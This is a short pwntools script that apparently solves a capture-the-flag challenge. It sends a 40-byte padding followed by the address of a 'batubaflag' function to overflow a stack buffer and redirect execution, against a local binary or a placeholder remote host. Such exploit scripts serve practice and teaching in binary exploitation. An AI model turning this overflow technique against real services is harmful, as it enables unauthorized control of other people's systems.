#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def write(file, val):
    with open(file, "wb") as f:
        f.write(val)


def main():
    r = conn()
    payload = flat(
        b'A'*40,
        exe.sym['batubaflag'],
    )
#    write("payload", payload)
    # good luck pwning :)
    r.sendline(payload)
    r.recvall()

    r.interactive()


if __name__ == "__main__":
    main()
